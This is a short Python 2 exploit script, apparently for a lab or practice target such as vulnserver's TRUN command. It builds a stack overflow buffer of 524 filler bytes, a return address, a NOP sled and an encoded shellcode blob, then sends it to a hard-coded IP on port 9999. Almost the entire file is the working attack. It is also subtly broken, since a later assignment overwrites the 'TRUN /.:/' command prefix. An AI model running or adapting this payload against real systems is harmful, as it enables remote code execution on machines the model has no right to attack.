import socket
import sys
buff ="TRUN /.:/"
buff = "A" * 524 
buff += "\xF3\x12\x17\x31" 
buff += "\x90" * 16
buff += b"\xbf\x86\x45\xa9\x70\xd9\xc1\xd9\x74\x24\xf4\x5d\x31"
buff += b"\xc9\xb1\x52\x31\x7d\x12\x03\x7d\x12\x83\x6b\xb9\x4b"
buff += b"\x85\x8f\xaa\x0e\x66\x6f\x2b\x6f\xee\x8a\x1a\xaf\x94"
buff += b"\xdf\x0d\x1f\xde\x8d\xa1\xd4\xb2\x25\x31\x98\x1a\x4a"
buff += b"\xf2\x17\x7d\x65\x03\x0b\xbd\xe4\x87\x56\x92\xc6\xb6"
buff += b"\x98\xe7\x07\xfe\xc5\x0a\x55\x57\x81\xb9\x49\xdc\xdf"
buff += b"\x01\xe2\xae\xce\x01\x17\x66\xf0\x20\x86\xfc\xab\xe2"
buff += b"\x29\xd0\xc7\xaa\x31\x35\xed\x65\xca\x8d\x99\x77\x1a"
buff += b"\xdc\x62\xdb\x63\xd0\x90\x25\xa4\xd7\x4a\x50\xdc\x2b"
buff += b"\xf6\x63\x1b\x51\x2c\xe1\xbf\xf1\xa7\x51\x1b\x03\x6b"
buff += b"\x07\xe8\x0f\xc0\x43\xb6\x13\xd7\x80\xcd\x28\x5c\x27"
buff += b"\x01\xb9\x26\x0c\x85\xe1\xfd\x2d\x9c\x4f\x53\x51\xfe"
buff += b"\x2f\x0c\xf7\x75\xdd\x59\x8a\xd4\x8a\xae\xa7\xe6\x4a"
buff += b"\xb9\xb0\x95\x78\x66\x6b\x31\x31\xef\xb5\xc6\x36\xda"
buff += b"\x02\x58\xc9\xe5\x72\x71\x0e\xb1\x22\xe9\xa7\xba\xa8"
buff += b"\xe9\x48\x6f\x7e\xb9\xe6\xc0\x3f\x69\x47\xb1\xd7\x63"
buff += b"\x48\xee\xc8\x8c\x82\x87\x63\x77\x45\xa2\x77\x70\xca"
buff += b"\xda\x75\x7e\xf0\xc8\xf3\x98\x92\xfc\x55\x33\x0b\x64"
buff += b"\xfc\xcf\xaa\x69\x2a\xaa\xed\xe2\xd9\x4b\xa3\x02\x97"
buff += b"\x5f\x54\xe3\xe2\x3d\xf3\xfc\xd8\x29\x9f\x6f\x87\xa9"
buff += b"\xd6\x93\x10\xfe\xbf\x62\x69\x6a\x52\xdc\xc3\x88\xaf"
buff += b"\xb8\x2c\x08\x74\x79\xb2\x91\xf9\xc5\x90\x81\xc7\xc6"
buff += b"\x9c\xf5\x97\x90\x4a\xa3\x51\x4b\x3d\x1d\x08\x20\x97"                                                                                               
buff += b"\xc9\xcd\x0a\x28\x8f\xd1\x46\xde\x6f\x63\x3f\xa7\x90"                                                                                               
buff += b"\x4c\xd7\x2f\xe9\xb0\x47\xcf\x20\x71\x77\x9a\x68\xd0"
buff += b"\x10\x43\xf9\x60\x7d\x74\xd4\xa7\x78\xf7\xdc\x57\x7f"
buff += b"\xe7\x95\x52\x3b\xaf\x46\x2f\x54\x5a\x68\x9c\x55\x4f"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	s.connect(('10.10.189.31', 9999))
except:

	print "Error"

	sys.exit(0)

s.recv(1024)
s.send(buff)
